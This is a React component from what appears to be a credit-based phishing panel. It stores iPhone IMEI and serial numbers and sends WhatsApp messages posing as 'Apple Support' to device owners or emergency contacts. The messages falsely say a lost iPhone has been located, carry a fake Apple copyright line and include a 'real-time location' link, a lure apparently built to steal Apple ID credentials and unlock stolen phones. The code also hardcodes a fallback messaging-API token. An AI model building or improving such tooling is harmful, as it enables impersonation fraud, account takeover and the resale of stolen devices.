import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { toast } from '@/hooks/use-toast';
import { Trash2, Send, RefreshCw, Edit } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { getIphoneImageUrl } from '@/utils/iphoneImages';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode?: boolean; // Made optional to fix compilation error
  status: string;
  created_at: string;
  updated_at: string;
  user_id: string;
}

interface ProcessListProps {
  userType: 'admin' | 'user';
}

const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(true);
  const [sendingMessage, setSendingMessage] = useState<{ id: string; language: string } | null>(null);
  const [userCredits, setUserCredits] = useState(0);

  useEffect(() => {
    loadProcesses();
    loadUserCredits();
    
    // Configurar subscripción en tiempo real para cambios en processes
    const channel = supabase
      .channel('processes-changes')
      .on('postgres_changes', 
        { event: '*', schema: 'public', table: 'processes' },
        (payload) => {
          console.log('Process change detected:', payload);
          loadProcesses(); // Recargar procesos cuando hay cambios
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [userType]);

  const loadUserCredits = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) return;

      const { data: profile } = await supabase
        .from('profiles')
        .select('credits')
        .eq('id', session.user.id)
        .single();

      setUserCredits(profile?.credits || 0);
    } catch (error) {
      console.error('Error loading user credits:', error);
    }
  };

  const loadProcesses = async () => {
    try {
      setLoading(true);
      console.log('Loading processes for userType:', userType);
      
      // Verificar sesión del usuario
      const { data: { session } } = await supabase.auth.getSession();
      console.log('Current session:', session?.user?.email);

      if (!session) {
        console.log('No session found');
        setProcesses([]);
        return;
      }

      // Todos los usuarios (incluido admin) solo ven sus propios procesos
      console.log('Loading processes for user:', session.user.id);
      const { data, error } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', session.user.id)
        .order('created_at', { ascending: false });
      
      console.log('Processes query result:', { data, error, userType });

      if (error) {
        console.error('Error loading processes:', error);
        throw error;
      }

      console.log('Processes loaded:', data?.length || 0);
      // Ensure lost_mode has a default value and handle cases where it doesn't exist in the database
      const processesWithDefaults = data?.map(process => ({
        ...process,
        lost_mode: Boolean((process as any).lost_mode) // Use type assertion to safely access lost_mode
      })) || [];
      
      setProcesses(processesWithDefaults);
    } catch (error: any) {
      console.error('Error loading processes:', error);
      toast({
        title: "Error",
        description: `Error al cargar procesos: ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const deleteProcess = async (processId: string) => {
    if (!confirm('¿Estás seguro de que quieres eliminar este proceso?')) {
      return;
    }

    try {
      console.log('Deleting process:', processId);
      
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) {
        console.error('Error deleting process:', error);
        throw error;
      }

      toast({
        title: "Proceso eliminado",
        description: "El proceso ha sido eliminado exitosamente",
      });

      // Recargar procesos después de eliminar
      await loadProcesses();
    } catch (error: any) {
      console.error('Error deleting process:', error);
      toast({
        title: "Error",
        description: error.message || "Error al eliminar proceso",
        variant: "destructive",
      });
    }
  };

  // Función para verificar si una imagen existe
  const checkImageExists = async (url: string): Promise<boolean> => {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      return response.ok;
    } catch (error) {
      console.log('Image check failed:', error);
      return false;
    }
  };

  const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
    try {
      // Verificar créditos antes de enviar
      if (userCredits <= 0) {
        toast({
          title: "Sin créditos suficientes",
          description: "No tienes créditos suficientes para enviar mensajes. Contacta al administrador.",
          variant: "destructive",
        });
        return;
      }

      setSendingMessage({ id: process.id, language });
      console.log(`Sending WhatsApp message for process: ${process.id} in ${language}`);

      // Obtener configuración según el idioma
      const settingsKeys = language === 'spanish' 
        ? ['whatsapp_instance', 'whatsapp_token']
        : ['whatsapp_instance_en', 'whatsapp_token_en'];

      const { data: settings } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', settingsKeys);

      const config = settings?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      const instanceId = language === 'spanish' 
        ? (config?.whatsapp_instance || 'instance126876')
        : (config?.whatsapp_instance_en || 'instance_en_default');
        
      const token = language === 'spanish' 
        ? (config?.whatsapp_token || '4ecj8581tubua7ry')
        : (config?.whatsapp_token_en || 'token_en_default');

      // Verificar que existan las configuraciones para el idioma seleccionado
      if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
        toast({
          title: "Configuración faltante",
          description: `No hay configuración de WhatsApp para ${language === 'spanish' ? 'español' : 'inglés'}. Configúrala en Configuraciones.`,
          variant: "destructive",
        });
        return;
      }

      // Obtener la URL de la imagen del iPhone basada en modelo y color
      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      console.log('Generated iPhone image URL:', imageUrl);

      // Verificar si la imagen existe
      const imageExists = await checkImageExists(imageUrl);
      console.log('Image exists:', imageExists);

      // Crear el mensaje personalizado según el idioma
      let message = '';
      
      // Determinar el texto de estado según el modo perdido
      const statusText = language === 'spanish' 
        ? (process.lost_mode 
          ? '✅ iPhone en modo perdido localizado con éxito' 
          : '✅ iPhone localizado con éxito')
        : (process.lost_mode 
          ? '✅ iPhone in lost mode successfully located' 
          : '✅ iPhone successfully located');
      
      if (language === 'spanish') {
        if (process.contact_type === 'propietario') {
          if (process.owner_name) {
            message = `*Soporte de Apple 👨🏽‍🔧*

*${statusText}*
*👤 Propietario: ${process.owner_name}*

*📱 Modelo:* ${process.iphone_model}
*💾 Almacenamiento:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serie:* ${process.serial_number}

*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `

*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
          } else {
            message = `*Soporte de Apple 👨🏽‍🔧*

*${statusText}*

*📱 Modelo:* ${process.iphone_model}
*💾 Almacenamiento:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serie:* ${process.serial_number}

*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `

*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
          }
        } else {
          if (process.owner_name) {
            message = `*Soporte de Apple 👨🏽‍🔧*

*🚨 Eres un contacto de emergencia ${process.owner_name}*

*${statusText}*

*📱 Modelo:* ${process.iphone_model}
*💾 Almacenamiento:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serie:* ${process.serial_number}

*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `

*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
          } else {
            message = `*Soporte de Apple 👨🏽‍🔧*

*🚨 Eres un contacto de emergencia*

*${statusText}*

*📱 Modelo:* ${process.iphone_model}
*💾 Almacenamiento:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serie:* ${process.serial_number}

*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `

*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
          }
        }
      } else {
        // Mensajes en inglés
        if (process.contact_type === 'propietario') {
          if (process.owner_name) {
            message = `*Apple Support 👨🏽‍🔧*

*${statusText}*
*👤 Owner: ${process.owner_name}*

*📱 Model:* ${process.iphone_model}
*💾 Storage:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serial:* ${process.serial_number}

*🧾 Type Menu to request assistance.*${process.url ? `

*🔗 Link to view real-time location:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. All rights reserved.*`;
          } else {
            message = `*Apple Support 👨🏽‍🔧*

*${statusText}*

*📱 Model:* ${process.iphone_model}
*💾 Storage:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serial:* ${process.serial_number}

*🧾 Type Menu to request assistance.*${process.url ? `

*🔗 Link to view real-time location:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. All rights reserved.*`;
          }
        } else {
          if (process.owner_name) {
            message = `*Apple Support 👨🏽‍🔧*

*🚨 You are an emergency contact for ${process.owner_name}*

*${statusText}*

*📱 Model:* ${process.iphone_model}
*💾 Storage:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serial:* ${process.serial_number}

*🧾 Type Menu to request assistance.*${process.url ? `

*🔗 Link to view real-time location:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. All rights reserved.*`;
          } else {
            message = `*Apple Support 👨🏽‍🔧*

*🚨 You are an emergency contact*

*${statusText}*

*📱 Model:* ${process.iphone_model}
*💾 Storage:* ${process.storage}
*🎨 Color:* ${process.color}
*📟 IMEI:* ${process.imei}
*🔑 Serial:* ${process.serial_number}

*🧾 Type Menu to request assistance.*${process.url ? `

*🔗 Link to view real-time location:* ${process.url}` : ''}

*Copyright © 2025 Apple Inc. All rights reserved.*`;
          }
        }
      }

      let result;

      // Enviar mensaje con imagen si existe, solo texto si no existe
      if (imageExists) {
        console.log('Sending message with image');
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: `${process.country_code}${process.phone_number}`,
            image: imageUrl,
            caption: message,
          }),
        });
        result = await response.json();
      } else {
        console.log('Image not found, sending text only message');
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: `${process.country_code}${process.phone_number}`,
            body: message,
          }),
        });
        result = await response.json();
      }

      console.log('WhatsApp API response:', result);

      // VERIFICAR QUE EL MENSAJE SE ENVIÓ CORRECTAMENTE ANTES DE COBRAR
      if (result.sent === true || (result.sent === "true")) {
        // Obtener el usuario actual
        const { data: { user } } = await supabase.auth.getUser();
        
        if (!user) {
          throw new Error('Usuario no autenticado');
        }

        // SOLO DESCONTAR CRÉDITO SI EL MENSAJE SE ENVIÓ EXITOSAMENTE
        const { error: creditError } = await supabase
          .from('profiles')
          .update({ 
            credits: userCredits - 1,
            updated_at: new Date().toISOString()
          })
          .eq('id', user.id);

        if (creditError) {
          console.error('Error updating credits:', creditError);
          throw new Error('Error al descontar créditos');
        }

        // Actualizar el estado local de créditos
        setUserCredits(prev => prev - 1);

        // Guardar mensaje en la base de datos
        const { error: messageError } = await supabase
          .from('messages')
          .insert({
            user_id: user.id,
            process_id: process.id,
            message_content: message,
            recipient_phone: `${process.country_code}${process.phone_number}`,
            status: 'sent'
          });

        if (messageError) {
          console.error('Error saving message:', messageError);
        }

        // Actualizar estado del proceso
        const { error: updateError } = await supabase
          .from('processes')
          .update({ 
            status: 'enviado',
            updated_at: new Date().toISOString()
          })
          .eq('id', process.id);

        if (updateError) {
          console.error('Error updating process status:', updateError);
        }

        const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
        const languageText = language === 'spanish' ? 'español' : 'inglés';
        toast({
          title: "Mensaje enviado",
          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
        });

        // Recargar procesos
        await loadProcesses();
      } else {
        // SI EL MENSAJE NO SE ENVIÓ, NO COBRAR Y MOSTRAR ERROR
        const errorMessage = result.message || result.error || 'La instancia de WhatsApp no está funcionando correctamente';
        throw new Error(`Error en la instancia: ${errorMessage}`);
      }
    } catch (error: any) {
      console.error('Error sending WhatsApp message:', error);
      toast({
        title: "Error de envío",
        description: `${error.message}. No se han descontado créditos.`,
        variant: "destructive",
      });
    } finally {
      setSendingMessage(null);
    }
  };

  if (loading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="p-6">
          <p className="text-blue-200/70 text-center">Cargando procesos...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-bold text-blue-300">
          Mis Procesos ({processes.length})
        </h2>
        <div className="flex items-center space-x-4">
          <div className="bg-gradient-to-r from-purple-600 to-purple-800 text-white px-4 py-2 rounded-lg">
            <span className="text-sm">Créditos: {userCredits}</span>
          </div>
          <Button
            onClick={loadProcesses}
            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-300"
            size="sm"
          >
            <RefreshCw className="h-4 w-4 mr-2" />
            Actualizar
          </Button>
        </div>
      </div>

      {processes.length === 0 ? (
        <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
          <CardContent className="p-8">
            <div className="text-center">
              <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
              <p className="text-blue-200/50 text-sm">
                Los procesos que agregues aparecerán aquí listos para enviar.
              </p>
            </div>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-4">
          {processes.map((process) => (
            <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
              <CardHeader>
                <div className="flex justify-between items-start">
                  <div>
                    <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                    <p className="text-blue-200/70 text-sm">
                      {process.country_code} {process.phone_number} ({process.contact_type})
                    </p>
                    {process.owner_name && (
                      <p className="text-blue-200/60 text-xs mt-1">
                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
                      </p>
                    )}
                    {process.lost_mode && (
                      <p className="text-orange-400 text-xs mt-1 font-medium">
                        📱 En modo perdido
                      </p>
                    )}
                  </div>
                  <div className="flex items-center space-x-2">
                    <Badge 
                      variant={process.status === 'enviado' ? 'default' : 'secondary'}
                      className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
                    >
                      {process.status}
                    </Badge>
                    <div className="flex space-x-1">
                      {/* Botón enviar en Español */}
                      <Button
                        size="sm"
                        onClick={() => sendWhatsAppMessage(process, 'spanish')}
                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
                        className={`${
                          userCredits <= 0 
                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                            : 'bg-blue-600/20 hover:bg-blue-600/30 text-blue-300'
                        }`}
                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar en español"}
                      >
                        {sendingMessage?.id === process.id && sendingMessage?.language === 'spanish' ? (
                          <RefreshCw className="h-4 w-4 animate-spin" />
                        ) : (
                          <>🇪🇸</>
                        )}
                      </Button>

                      {/* Botón enviar en Inglés */}
                      <Button
                        size="sm"
                        onClick={() => sendWhatsAppMessage(process, 'english')}
                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
                        className={`${
                          userCredits <= 0 
                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                            : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
                        }`}
                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Send in English"}
                      >
                        {sendingMessage?.id === process.id && sendingMessage?.language === 'english' ? (
                          <RefreshCw className="h-4 w-4 animate-spin" />
                        ) : (
                          <>🇺🇸</>
                        )}
                      </Button>

                      <Button
                        size="sm"
                        onClick={() => deleteProcess(process.id)}
                        className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
                        title="Eliminar proceso"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                  <div>
                    <p className="text-blue-200/50">Modelo:</p>
                    <p className="text-blue-200">{process.iphone_model}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Almacenamiento:</p>
                    <p className="text-blue-200">{process.storage}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Color:</p>
                    <p className="text-blue-200">{process.color}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">IMEI:</p>
                    <p className="text-blue-200">{process.imei}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Número de Serie:</p>
                    <p className="text-blue-200">{process.serial_number}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Tipo de Contacto:</p>
                    <p className="text-blue-200">{process.contact_type}</p>
                  </div>
                  {process.owner_name && (
                    <div>
                      <p className="text-blue-200/50">
                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
                      </p>
                      <p className="text-blue-200">{process.owner_name}</p>
                    </div>
                  )}
                  {process.url && (
                    <div className="md:col-span-2 lg:col-span-3">
                      <p className="text-blue-200/50">URL:</p>
                      <p className="text-blue-200 break-all">{process.url}</p>
                    </div>
                  )}
                  <div className="md:col-span-2 lg:col-span-3">
                    <p className="text-blue-200/50">Creado:</p>
                    <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
};

export default ProcessList;
